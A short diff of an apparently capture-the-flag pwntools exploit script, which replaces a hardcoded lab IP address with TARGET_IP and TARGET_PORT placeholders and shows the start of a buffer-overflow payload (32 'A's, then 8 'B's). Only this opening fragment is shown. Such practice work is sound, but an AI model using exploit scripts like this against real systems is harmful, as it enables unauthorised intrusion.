@@ -2,7 +2,7 @@ from multiprocessing import context
 from pwn import *
 
 
-con = remote('10.10.195.46', 5700)
+con = remote('TARGET_IP', TARGET_PORT)
 
 payload  = 'A'*32
 payload += 'B'*8
